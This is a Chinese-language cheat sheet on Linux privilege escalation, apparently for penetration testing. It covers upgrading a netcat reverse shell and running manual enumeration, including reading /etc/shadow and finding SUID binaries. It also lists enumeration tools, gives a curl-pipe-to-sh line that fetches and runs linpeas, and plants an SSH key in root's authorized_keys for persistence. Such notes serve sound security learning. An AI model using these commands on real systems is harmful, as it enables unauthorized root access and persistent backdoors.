# Linux提权小记

## 运行 Linpeas 脚本以枚举远程服务器

```
    ./linpeas.sh
```

## 切换完整 Bash

```
python3 -c 'import pty;pty.spawn("/bin/bash");'

CTRL + Z
stty raw -echo
fg
export TERM=xterm-color

OR

rlwrap nc -lvnp <port>
```

## 手工枚举

```
id：显示当前⽤户的 UID（⽤户 ID）、GID（组 ID）以及所属的其他组的信息
who：显示当前登录的⽤户及相关信息，如登录时间、终端等
whoami：显示当前⽤户的⽤户名
w：提供关于当前登录⽤户的详细信息，包括他们在做什么以及系统的负载信息
last:：显示系统最近的登录记录
```


```
uname -a：为我们提供关于系统使⽤的内核的附加详细信息。在寻找可能导致提权的任何潜在内核漏洞时，这将⾮常有⽤
lsb_release -a：这个命令⽤于显示Linux标准基础（LSB）的发⾏信息。 -a 选项表示显示所有
可⽤信息。它将显示诸如发⾏编号、发⾏名称、发⾏描述等信息
cat /proc/version ：这个命令⽤于显示内核版本和编译信息。 /proc/version ⽂件包含了内核
版本、编译器版本和其他相关信息。要查看是否安装了GCC就可以⽤这条命令
cat /etc/issue：这个命令⽤于查看系统的发⾏版本信息。 /etc/issue ⽂件包含了操作系统发⾏版的名称和版本
cat /etc/*-release：这个命令⽤于查看系统发⾏版的详细信息。它会搜索 /etc/ ⽬录下所有以
-release 结尾的⽂件，并显示它们的内容。这些⽂件通常包含操作系统的发⾏名称、版本、代号等信息
```


```
ip a:旧版命令ifconfig,这些命令为我们提供有关⽹卡、⽹络配置的信息。多张⽹卡配合路由信息可以发现内⽹⽹段
ip route：⽤于查询路由表，route是过时的命令
ip neigh：⽤于查询邻居表
arp -a：则⽤于显示ARP缓存，有些⼈⽤它作内⽹主机发现
```


```
hostname:查看机器主机名，新版内核linux可以用hostnamectl
```


```
getcap -r / 2>/dev/null:关于Linux capabilities ，它为进程提供了⼀部分可⽤的 root 权限
⼦集。有效地将 root 权限划分成较⼩且独特的单元。然后，可以独⽴地将这些单元授予进程。这样，权限集合就会减少，降低了被利⽤的⻛险
```


```
ls -liah:列出详细隐藏信息
history:历史记录
```


```
cat /etc/passwd
cat /etc/shadow
cat /etc/crontab:自动任务
echo $PATH
env:环境变量
ps -ef:查看进程
ps axjf ：查看进程树
```


```
netstat -a ：显示所有正在监听的端⼝和已建⽴的连接。
netstat -at 或 netstat -au 也可⽤于分别列出TCP或UDP协议。
netstat -l ：列出处于“监听”模式的端⼝。这些端⼝是打开的，并准备接受传⼊的连接。
可以将其与“t”选项⼀起使⽤，仅列出使⽤TCP协议监听的端⼝
netstat -s ：按协议列出⽹络使⽤统计数据（如下所示）也可以与 -t 或 -u 选项⼀起使⽤以限制
输出到特定协议
netstat -tp ：列出服务名称和PID信息的连接。
netstat -i ：显示接⼝统计信息。我们在下⾯看到“eth0”和“tun0”⽐“tun1”更活跃
```


```
find / -perm -u=s -type f 2>/dev/null ：查找设置了SUID位的⽂件，这使我们可以以⽐当前⽤
户更⾼的特权级别运⾏⽂件
```


```
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp tmux
screen 2>/dev/nul
```
![[Pasted image 20250504164902.png]]

```
cat /etc/fstab:检测未挂载的⽂件系统
```




## 自动化枚举

### LinPEAS

全称为 Linux Privilege Escalation Awesome Script ，是⼀个⽤来搜索类 unix 主机上可能
的提权路径的⾃动化脚本。

Github：https://github.com/peass-ng/PEASS-ng

```
curl -L https://github.com/carlospolop/PEASSng/releases/latest/download/linpeas.sh | sh
```

### LinEnum

⼀个流⾏的 Linux 本地枚举脚本，⽤于收集有关系统的各种信息，识别不安全的配置，
提取可⽤于提升权限的漏洞信息

Github：https://github.com/rebootuser/LinEnum

### linux-smart-enumeration （lse）

这是⼀个具有模块化功能的 Linux 本地枚举脚本它可在不同的等级上运⾏以获取不同详细程度的信息

Github：https://github.com/diego-treitos/linux-smart-enumeration

### linux-exploit-suggester

该⼯具主要⽤于识别 Linux 系统中可能存在的可利⽤的漏洞，
以帮助⽤户提升权限。

Github：https://github.com/The-Z-Labs/linux-exploit-suggester

### Linuxprivchecker

⼀个⽤于检查 Linux 系统潜在安全问题的 Python 脚本，
包括⽂件权限、系统服务和 SUID ⼆进制⽂件等。 

Github：https://github.com/sleventyeleven/linuxprivchecker

### unix-privesc-check

这个脚本主要⽤于识别 类UNIX 系统中可能的权限升级路径，
通过检查⽂件权限、系统配置等⽅⾯的问题

Github：https://github.com/pentestmonkey/unix-privesc-check


## 非对称加密

-  创建新的SSH密钥

```
    ssh-keygen -f key
```

-  将生成的公钥添加到用户

```
    echo "ssh-rsa AAAAB...SNIP...M= enil@aaa">> /root/.ssh/authorized_keys
```
-  使用生成的私钥SSH连接到服务器

```
    ssh root@10.10.10.10 -i key
```
-  枚举脚本

```
	PEASS
```

